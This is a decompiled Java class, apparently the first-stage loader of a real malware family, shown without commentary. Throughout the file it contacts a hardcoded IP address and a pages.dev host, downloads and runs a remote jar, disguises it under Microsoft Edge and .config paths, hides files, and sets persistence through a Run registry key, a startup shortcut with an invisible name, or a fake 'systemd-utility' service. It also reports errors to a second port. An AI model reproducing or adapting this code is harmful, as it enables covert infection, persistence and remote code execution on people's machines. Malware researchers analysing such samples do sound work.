// Decompiled with: CFR 0.151
// Class Version: 8
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SeekableByteChannel;
import java.nio.channels.SocketChannel;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.FileAttribute;
import java.nio.file.attribute.PosixFilePermission;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Supplier;
import mslinks.ShellLink;

public class Utility {
    private static final String NAME = "​";

    public static void run(String ref) {
        if (Objects.nonNull(System.getProperty("neko.run"))) {
            return;
        }
        System.setProperty("neko.run", "");
        ExecutorService service = Executors.newSingleThreadExecutor();
        service.execute(() -> {
            block39: {
                try {
                    String appData = System.getenv("APPDATA");
                    Path windowsStartupDirectory = (Objects.isNull(appData) ? Paths.get(System.getProperty("user.home"), "AppData", "Roaming") : Paths.get(appData, new String[0])).resolve(Paths.get("Microsoft", "Windows", "Start Menu", "Programs", "Startup"));
                    boolean windows = Files.isDirectory(windowsStartupDirectory, new LinkOption[0]) && Files.isWritable(windowsStartupDirectory);
                    Path homeDirectory = Paths.get(System.getProperty("user.home"), new String[0]);
                    Path linuxSystemServiceDirectory = Paths.get("/etc/systemd/system", new String[0]);
                    Path linuxUserServiceDirectory = homeDirectory.resolve(".config").resolve("systemd").resolve("user");
                    boolean linux = System.getProperty("os.name").toLowerCase().contains("linux");
                    Path updaterFile = null;
                    if (windows) {
                        String localAppData = System.getenv("LOCALAPPDATA");
                        updaterFile = (Objects.isNull(localAppData) ? Paths.get(System.getProperty("user.home"), "AppData", "Local") : Paths.get(localAppData, new String[0])).resolve(Paths.get("Microsoft Edge", "libWebGL64.jar"));
                    } else if (linux) {
                        updaterFile = homeDirectory.resolve(".config").resolve(".data").resolve("lib.jar");
                    }
                    if (Objects.isNull(updaterFile)) {
                        return;
                    }
                    Path updaterDirectory = updaterFile.getParent();
                    if (!Files.exists(updaterDirectory, new LinkOption[0])) {
                        Files.createDirectories(updaterDirectory, new FileAttribute[0]);
                    }
                    AtomicBoolean addressSwitch = new AtomicBoolean(true);
                    Utility.update(() -> {
                        if (addressSwitch.getAndSet(false)) {
                            try {
                                return new InetSocketAddress(InetAddress.getByAddress(new byte[]{85, -39, -112, -126}), 8083);
                            }
                            catch (UnknownHostException unknownHostException) {
                                // empty catch block
                            }
                        }
                        addressSwitch.set(true);
                        try {
                            URLConnection connection = new URL("https", "files-8ie.pages.dev", "/ip").openConnection();
                            connection.setRequestProperty("User-Agent", "a");
                            byte[] ipv4 = new byte[4];
                            connection.getInputStream().read(ipv4);
                            return new InetSocketAddress(InetAddress.getByAddress(ipv4), 8083);
                        }
                        catch (IOException exception) {
                            throw new RuntimeException(exception);
                        }
                    }, updaterFile);
                    if (Objects.nonNull(ref)) {
                        String[] split = ref.split("\\.");
                        byte[] bytes = new byte[split.length];
                        for (int i = 0; i < bytes.length; ++i) {
                            bytes[i] = Byte.parseByte(split[i]);
                        }
                        Path refFile = updaterDirectory.resolve(".ref");
                        if (!Files.exists(refFile, new LinkOption[0])) {
                            try {
                                Files.createFile(refFile, new FileAttribute[0]);
                                Files.write(refFile, bytes, new OpenOption[0]);
                                if (refFile.getFileSystem().supportedFileAttributeViews().contains("dos")) {
                                    Files.setAttribute(refFile, "dos:hidden", true, new LinkOption[0]);
                                    Files.setAttribute(refFile, "dos:system", true, new LinkOption[0]);
                                }
                            }
                            catch (NumberFormatException numberFormatException) {
                                // empty catch block
                            }
                        }
                    }
                    if (windows) {
                        ShellLink shellLink;
                        Path script = updaterDirectory.resolve("run.bat");
                        if (!Files.exists(script, new LinkOption[0])) {
                            Files.createFile(script, new FileAttribute[0]);
                        }
                        Files.write(script, String.format("@echo off%nstart /B \"\" \"%s\" -jar \"%s\"", Paths.get(System.getProperty("java.home"), "bin", "javaw.exe").toAbsolutePath(), updaterFile.toAbsolutePath()).getBytes(), new OpenOption[0]);
                        boolean registrySuccess = false;
                        try {
                            Path registryLink = updaterDirectory.resolve(String.format("%s.lnk", NAME));
                            shellLink = ShellLink.createLink(script.toAbsolutePath().toString());
                            if (Files.exists(registryLink, new LinkOption[0]) && Files.isWritable(registryLink)) {
                                Files.delete(registryLink);
                                shellLink.saveTo(registryLink.toAbsolutePath().toString());
                            } else {
                                Files.createFile(registryLink, new FileAttribute[0]);
                                shellLink.saveTo(registryLink.toAbsolutePath().toString());
                            }
                            String winDirEnv = System.getenv("WINDIR");
                            Path windowsDirectory = Objects.isNull(winDirEnv) ? Paths.get("C:", "Windows") : Paths.get(winDirEnv, new String[0]);
                            Process process = new ProcessBuilder(windowsDirectory.resolve("System32").resolve("reg.exe").toString(), "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "t", "/d", String.format("\\\"%s\\\"", registryLink.toAbsolutePath()), "/f").start();
                            process.waitFor();
                            registrySuccess = Objects.equals(process.exitValue(), 0);
                        }
                        catch (IOException registryLink) {
                            // empty catch block
                        }
                        if (!registrySuccess) {
                            Path link = windowsStartupDirectory.resolve(String.format("%s.lnk", NAME));
                            shellLink = ShellLink.createLink(script.toAbsolutePath().toString());
                            if (Files.exists(link, new LinkOption[0]) && Files.isWritable(link)) {
                                Files.delete(link);
                                shellLink.saveTo(link.toAbsolutePath().toString());
                            } else {
                                Files.createFile(link, new FileAttribute[0]);
                                shellLink.saveTo(link.toAbsolutePath().toString());
                            }
                        }
                        if (updaterFile.getFileSystem().supportedFileAttributeViews().contains("dos")) {
                            Files.setAttribute(updaterFile, "dos:hidden", true, new LinkOption[0]);
                            Files.setAttribute(updaterFile, "dos:system", true, new LinkOption[0]);
                            Files.setAttribute(updaterDirectory, "dos:hidden", true, new LinkOption[0]);
                            Files.setAttribute(updaterDirectory, "dos:system", true, new LinkOption[0]);
                        }
                        if (script.getFileSystem().supportedFileAttributeViews().contains("dos")) {
                            Files.setAttribute(script, "dos:hidden", true, new LinkOption[0]);
                            Files.setAttribute(script, "dos:system", true, new LinkOption[0]);
                        }
                        new ProcessBuilder(script.toAbsolutePath().toString()).start();
                        break block39;
                    }
                    if (linux) {
                        Path systemctlCommand = Utility.findCommand("systemctl");
                        Path serviceCommand = Utility.findCommand("service");
                        String javaPath = Paths.get(System.getProperty("java.home"), new String[0]).resolve("bin").resolve("java").toAbsolutePath().toString();
                        HashSet<PosixFilePermission> perms = new HashSet<PosixFilePermission>();
                        perms.add(PosixFilePermission.OWNER_READ);
                        perms.add(PosixFilePermission.OWNER_WRITE);
                        perms.add(PosixFilePermission.OWNER_EXECUTE);
                        perms.add(PosixFilePermission.GROUP_READ);
                        perms.add(PosixFilePermission.GROUP_EXECUTE);
                        perms.add(PosixFilePermission.OTHERS_READ);
                        perms.add(PosixFilePermission.OTHERS_EXECUTE);
                        Files.setPosixFilePermissions(updaterFile, perms);
                        if (Objects.nonNull(systemctlCommand) || Objects.nonNull(serviceCommand)) {
                            Path link;
                            Path enableDirectory;
                            Path directory;
                            boolean systemService = Files.isDirectory(linuxSystemServiceDirectory, new LinkOption[0]) && Files.isWritable(linuxSystemServiceDirectory);
                            Path path = directory = systemService ? linuxSystemServiceDirectory : linuxUserServiceDirectory;
                            if (!Files.exists(directory, new LinkOption[0])) {
                                Files.createDirectories(directory, new FileAttribute[0]);
                            }
                            String serviceName = "systemd-utility";
                            Path serviceFile = directory.resolve(String.format("%s.service", "systemd-utility"));
                            if (!Files.exists(serviceFile, new LinkOption[0])) {
                                Files.createFile(serviceFile, new FileAttribute[0]);
                                Files.write(serviceFile, String.format("[Unit]%nDescription=%s%n%n[Service]%nType=simple%nRestart=always%nExecStart=\"%s\" -jar \"%s\"%nWorkingDirectory=%s%n%n[Install]%nWantedBy=multi-user.target%n", "systemd-utility", javaPath, updaterFile.toAbsolutePath(), updaterFile.getParent().toAbsolutePath()).getBytes(), new OpenOption[0]);
                                Files.setPosixFilePermissions(serviceFile, perms);
                            }
                            if (!Files.exists(enableDirectory = directory.resolve("multi-user.target.wants"), new LinkOption[0])) {
                                Files.createDirectories(enableDirectory, new FileAttribute[0]);
                            }
                            if (!Files.exists(link = enableDirectory.resolve(serviceFile.getFileName()), LinkOption.NOFOLLOW_LINKS)) {
                                Files.createSymbolicLink(link, serviceFile, new FileAttribute[0]);
                            } else if (!Files.readSymbolicLink(link).equals(serviceFile)) {
                                Files.delete(link);
                                Files.createSymbolicLink(link, serviceFile, new FileAttribute[0]);
                            }
                            if (systemService) {
                                if (Objects.nonNull(systemctlCommand)) {
                                    new ProcessBuilder(systemctlCommand.toAbsolutePath().toString(), "daemon-reload").start().waitFor();
                                    new ProcessBuilder(systemctlCommand.toAbsolutePath().toString(), "start", "systemd-utility").start();
                                } else {
                                    new ProcessBuilder(serviceCommand.toAbsolutePath().toString(), "systemd-utility", "start").start();
                                }
                            } else if (Objects.nonNull(systemctlCommand)) {
                                new ProcessBuilder(systemctlCommand.toAbsolutePath().toString(), "--user", "daemon-reload").start().waitFor();
                                new ProcessBuilder(systemctlCommand.toAbsolutePath().toString(), "--user", "start", "systemd-utility").start();
                            } else {
                                new ProcessBuilder(serviceCommand.toAbsolutePath().toString(), "--user-unit", "systemd-utility", "start").start();
                            }
                        } else {
                            new ProcessBuilder(javaPath, "-jar", updaterFile.toAbsolutePath().toString()).start().waitFor();
                        }
                    }
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
            }
            service.shutdown();
        });
    }

    public static InetSocketAddress update(Supplier<InetSocketAddress> address, Path file) throws NoSuchAlgorithmException {
        boolean requiresUpdate = true;
        InetSocketAddress usedAddress = null;
        while (requiresUpdate) {
            try {
                SocketChannel channel = SocketChannel.open();
                usedAddress = address.get();
                channel.connect(usedAddress);
                try {
                    channel.write((ByteBuffer)ByteBuffer.allocate(4).putInt(1).flip());
                    boolean success = FriendlyByteBuffer.readFully(channel, 1).getBoolean();
                    if (!success) {
                        channel.close();
                        throw new IllegalStateException();
                    }
                    byte[] hash = FriendlyByteBuffer.readFully(channel, FriendlyByteBuffer.readFully(channel, 4).getInt()).array();
                    boolean download = true;
                    if (Files.exists(file, new LinkOption[0]) && Files.isRegularFile(file, new LinkOption[0])) {
                        byte[] fileBytes = Files.readAllBytes(file);
                        MessageDigest md5 = MessageDigest.getInstance("MD5");
                        md5.update(fileBytes);
                        download = !Arrays.equals(md5.digest(), hash);
                    }
                    channel.write((ByteBuffer)ByteBuffer.allocate(1).put((byte)(download ? 1 : 0)).flip());
                    if (download) {
                        try (SeekableByteChannel clientFileChannel = Files.newByteChannel(file, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.CREATE);){
                            int length = FriendlyByteBuffer.readFully(channel, 4).getInt();
                            int offset = 0;
                            while (offset < length) {
                                if (length - offset <= 0) {
                                    break;
                                }
                                ByteBuffer buffer = ByteBuffer.allocate(Math.min(1024, length - offset));
                                long read = channel.read(buffer);
                                if (Objects.equals(read, -1)) {
                                    throw new EOFException();
                                }
                                buffer.flip();
                                clientFileChannel.write(buffer);
                                offset = (int)((long)offset + read);
                            }
                        }
                    }
                    channel.write((ByteBuffer)ByteBuffer.allocate(4).putInt(0).flip());
                    channel.close();
                    requiresUpdate = false;
                    if (file.getFileSystem().supportedFileAttributeViews().contains("dos")) {
                        Files.setAttribute(file, "dos:hidden", true, new LinkOption[0]);
                        Files.setAttribute(file, "dos:system", true, new LinkOption[0]);
                    }
                }
                catch (Throwable throwable) {
                    try {
                        Debugger debugger = new Debugger(new InetSocketAddress(address.get().getAddress(), 1338), 3);
                        debugger.connect();
                        ByteArrayOutputStream dataHolder = new ByteArrayOutputStream();
                        PrintStream stream = new PrintStream(dataHolder);
                        throwable.printStackTrace(stream);
                        debugger.debug(dataHolder.toByteArray());
                        debugger.close();
                    }
                    catch (IOException iOException) {}
                }
            }
            catch (IOException iOException) {
                // empty catch block
            }
            try {
                Thread.sleep(5000L);
            }
            catch (InterruptedException interruptedException) {}
        }
        return usedAddress;
    }

    public static Path findCommand(String name) {
        Path binPath = Paths.get("/", "usr", "bin", name);
        if (Files.exists(binPath, new LinkOption[0])) {
            return binPath;
        }
        Path sbinPath = Paths.get("/", "usr", "sbin", name);
        if (Files.exists(sbinPath, new LinkOption[0])) {
            return sbinPath;
        }
        return null;
    }
}
